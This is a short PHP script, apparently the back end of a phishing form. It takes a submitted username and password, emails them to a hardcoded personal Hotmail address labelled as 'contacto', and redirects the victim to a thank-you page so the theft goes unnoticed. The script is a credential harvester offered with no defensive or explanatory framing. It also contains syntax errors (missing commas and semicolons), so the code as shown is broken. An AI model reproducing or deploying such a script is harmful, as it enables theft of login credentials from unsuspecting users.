<?php
$destino = "GabiMaidanaxD@hotmail.com";
$usuario = $_POST["texto"];
$contraseña = $_POST["contraseña"];

$contenido = "usuario: " . $usuario . "\ncontraseña" . $contraseña;

mail($destino,"contacto"$contenido)
header("location:gracias.html")
?>